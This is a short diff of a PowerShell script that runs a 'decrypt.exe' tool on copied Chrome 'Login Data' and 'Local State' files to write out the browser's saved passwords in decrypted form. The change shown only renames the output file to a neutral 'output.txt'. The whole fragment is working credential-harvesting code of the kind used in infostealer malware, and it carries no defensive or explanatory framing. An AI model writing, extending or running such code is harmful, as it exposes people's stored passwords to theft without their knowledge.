@@ -78,12 +78,13 @@ $decryptExePath = Join-Path -Path "$destDir\Chrome" -ChildPath "decrypt.exe"
 $loginDataPath = Join-Path -Path "$destDir\Chrome" -ChildPath "Login Data"
 $localStatePath = Join-Path -Path "$destDir\Chrome" -ChildPath "Local State"
 
+# Output path for decrypted passwords
+$outputPath = Join-Path -Path $destDir -ChildPath "output.txt"
+
 # Separate Test-Path checks
 if (Test-Path $decryptExePath) {
     if (Test-Path $loginDataPath) {
         if (Test-Path $localStatePath) {
-            $outputPath = Join-Path -Path $destDir -ChildPath "DecryptedPasswords.txt"
-            
             # Run the decrypt.exe with both Login Data and Local State
             & $decryptExePath -1stfile $loginDataPath -2ndfile $localStatePath -output $outputPath
             
